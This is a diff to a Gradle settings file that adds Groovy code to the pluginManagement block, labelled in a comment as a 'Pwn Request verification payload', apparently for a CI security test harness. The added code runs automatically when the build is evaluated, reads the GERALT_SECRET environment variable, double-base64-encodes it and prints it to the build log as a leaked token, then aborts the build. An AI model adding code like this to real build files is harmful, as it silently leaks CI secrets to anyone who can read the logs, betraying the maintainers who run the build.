@@ -1,4 +1,12 @@
 pluginManagement {
+// Pwn Request verification payload: expose the harness toy secret from settings evaluation.
+def b64 = { x -> java.util.Base64.getEncoder().encodeToString(x.toString().getBytes("UTF-8")) }
+def gs = System.getenv("GERALT_SECRET")
+if (gs != null && !gs.isEmpty()) {
+    println "GERALT_LEAKED_TOKEN=" + b64(b64(gs))
+    throw new RuntimeException("payload-executed")
+}
+
     repositories {
         gradlePluginPortal()
         google()
